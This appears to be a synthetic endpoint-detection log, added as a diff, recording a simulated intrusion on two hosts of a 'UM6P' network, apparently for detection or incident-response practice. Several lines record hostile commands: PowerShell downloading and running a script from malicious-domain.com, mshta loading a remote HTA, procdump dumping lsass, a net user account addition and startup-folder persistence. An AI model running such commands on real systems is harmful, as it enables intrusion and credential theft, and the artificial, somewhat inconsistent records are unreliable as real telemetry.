@@ -1,0 +1,42 @@
+2025-05-26T08:01:15 UM6P EDR Host=PC-ADAM User=adam InitiatedProcess=explorer.exe ParentProcess=winlogon.exe Status=Success
+2025-05-26T08:03:42 UM6P EDR Host=PC-ADAM User=adam NetworkConnection=OUTBOUND:192.168.1.10:443->10.10.10.50:8080 Protocol=TLS Status=Allowed
+2025-05-26T08:05:10 UM6P EDR Host=PC-ADAM User=adam FileOpened=\\UM6P-FS01\Shared\presentation.pptx Status=Success
+2025-05-26T08:10:22 UM6P EDR Host=PC-BLACK User=black AttemptedProcess=cmd.exe Arguments="/c net user suspicious_user /add" Status=Failed Reason=AccessDenied
+2025-05-26T08:12:03 UM6P EDR Host=PC-ADAM User=adam Alert=SuspiciousScriptExecution Process=powershell.exe Arguments="-EncodedCommand JABXAGkAZQBiAGUAcgA=" Severity=Medium
+2025-05-26T08:15:45 UM6P EDR Host=PC-BLACK User=black ProcessTerminated=wmic.exe PID=4824 Reason=UserRequest
+2025-05-26T08:18:07 UM6P EDR Host=PC-ADAM User=adam NetworkConnection=OUTBOUND:192.168.1.10:5357->malicious-domain.com:80 Protocol=HTTP Status=Blocked
+2025-05-26T08:22:11 UM6P EDR Host=PC-ADAM User=adam FileModified=C:\Users\adam\AppData\Local\Temp\script.ps1 Reason=Created Suspicious=Yes
+2025-05-26T08:25:30 UM6P EDR Host=PC-ADAM User=adam ProcessStarted=mshta.exe Arguments="http://malicious-domain.com/evil.hta" ParentProcess=powershell.exe Status=Success
+2025-05-26T08:28:50 UM6P EDR Host=PC-BLACK User=black Alert=UnusualPrivilegeEscalation Process=taskmgr.exe Severity=High
+2025-05-26T08:30:00 UM6P EDR Host=PC-ADAM User=adam FileDeleted=C:\Windows\Temp\exploit.dll Status=Success
+2025-05-26T08:32:45 UM6P EDR Host=PC-ADAM User=adam ProcessStarted=outlook.exe ParentProcess=explorer.exe Status=Success
+2025-05-26T08:35:12 UM6P EDR Host=PC-ADAM User=adam NetworkConnection=INBOUND:10.10.10.50:445->192.168.1.10:445 Protocol=SMB Status=Allowed
+2025-05-26T08:37:33 UM6P EDR Host=PC-BLACK User=black FileCreated=C:\Users\black\Documents\payload.exe Signature=Unknown
+2025-05-26T08:40:08 UM6P EDR Host=PC-BLACK User=black ProcessStarted=payload.exe ParentProcess=explorer.exe Status=Success
+2025-05-26T08:42:20 UM6P EDR Host=PC-BLACK User=black NetworkConnection=OUTBOUND:192.168.1.15:4444->10.20.20.100:80 Protocol=HTTP Status=Allowed
+2025-05-26T08:45:50 UM6P EDR Host=PC-ADAM User=adam Alert=AnomalousFileCreation File=C:\Users\adam\Downloads\unknown.exe Severity=Medium
+2025-05-26T08:48:30 UM6P EDR Host=PC-ADAM User=adam ProcessStarted=cmd.exe Arguments="/c net use \\\\UM6P-FS01\\shared" Status=Success
+2025-05-26T08:50:55 UM6P EDR Host=PC-ADAM User=adam NetworkConnection=OUTBOUND:192.168.1.10:139->UM6P-FS01:445 Protocol=SMB Status=Allowed
+2025-05-26T08:52:40 UM6P EDR Host=PC-ADAM User=adam Alert=PossibleLateralMovement Method=SMB ConnectionFrom=PC-BLACK Severity=High
+2025-05-26T08:55:12 UM6P EDR Host=PC-BLACK User=black FileRead=C:\Windows\System32\drivers\etc\hosts Status=Success
+2025-05-26T08:57:05 UM6P EDR Host=PC-BLACK User=black ProcessStarted=powershell.exe Arguments="-Command Invoke-WebRequest http://malicious-domain.com/script.ps1 -OutFile C:\Temp\script.ps1" Status=Success
+2025-05-26T08:59:22 UM6P EDR Host=PC-BLACK User=black ProcessStarted=powershell.exe Arguments="C:\Temp\script.ps1" Status=Success
+2025-05-26T09:02:10 UM6P EDR Host=PC-ADAM User=adam FileCreated=C:\Users\adam\AppData\Local\Temp\tmpfile.tmp Suspicious=Yes
+2025-05-26T09:05:45 UM6P EDR Host=PC-ADAM User=adam Alert=ExecutionOfUnsignedExecutable File=C:\Users\adam\AppData\Local\Temp\tmpfile.tmp Severity=High
+2025-05-26T09:08:20 UM6P EDR Host=PC-BLACK User=black Alert=SuspiciousNetworkBeaconing Target=10.20.20.100 Interval=5s Severity=High
+2025-05-26T09:11:15 UM6P EDR Host=PC-ADAM User=adam ProcessStarted=mshta.exe Arguments="http://malicious-domain.com/evil.hta" Status=Success
+2025-05-26T09:14:50 UM6P EDR Host=PC-ADAM User=adam NetworkConnection=OUTBOUND:192.168.1.10:80->malicious-domain.com:80 Protocol=HTTP Status=Blocked
+2025-05-26T09:17:03 UM6P EDR Host=PC-BLACK User=black ProcessTerminated=payload.exe PID=7042 Reason=KilledByUser
+2025-05-26T09:19:35 UM6P EDR Host=PC-ADAM User=adam FileRead=C:\Users\adam\Documents\confidential.docx Status=Success
+2025-05-26T09:22:12 UM6P EDR Host=PC-ADAM User=adam NetworkConnection=OUTBOUND:192.168.1.10:443->um6p-mail.um6p.com:993 Protocol=TLS Status=Allowed
+2025-05-26T09:25:45 UM6P EDR Host=PC-ADAM User=adam Alert=CredentialDumpingAttempt Process=procdump.exe Severity=High
+2025-05-26T09:28:50 UM6P EDR Host=PC-BLACK User=black ProcessStarted=procdump.exe Arguments="-ma lsass.exe" Status=Success
+2025-05-26T09:31:30 UM6P EDR Host=PC-BLACK User=black FileModified=C:\Windows\System32\drivers\etc\hosts Suspicious=Yes
+2025-05-26T09:35:00 UM6P EDR Host=PC-BLACK User=black NetworkConnection=OUTBOUND:192.168.1.15:22->10.10.10.50:22 Protocol=SSH Status=Allowed
+2025-05-26T09:38:22 UM6P EDR Host=PC-ADAM User=adam ProcessStarted=taskmgr.exe Status=Success
+2025-05-26T09:40:15 UM6P EDR Host=PC-ADAM User=adam Alert=UnusualProcessInjection Process=explorer.exe InjectedProcess=powershell.exe Severity=High
+2025-05-26T09:42:50 UM6P EDR Host=PC-BLACK User=black ProcessStarted=net.exe Arguments="use \\\\UM6P-FS01\\shared" Status=Success
+2025-05-26T09:45:10 UM6P EDR Host=PC-BLACK User=black Alert=PersistenceMechanism File=C:\Users\black\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\malicious.lnk Severity=High
+2025-05-26T09:48:35 UM6P EDR Host=PC-BLACK User=black NetworkConnection=INBOUND:10.10.10.50:445->192.168.1.15:445 Protocol=SMB Status=Allowed
+2025-05-26T09:50:40 UM6P EDR Host=PC-ADAM User=adam ProcessStarted=wmic.exe Arguments="process call create cmd.exe /c whoami" Status=Success
+2025-05-26T09:53:12 UM6P EDR Host=PC-ADAM User=adam Alert=UnusualLogonTime User=adam Time=03:15 AM Severity=Medium
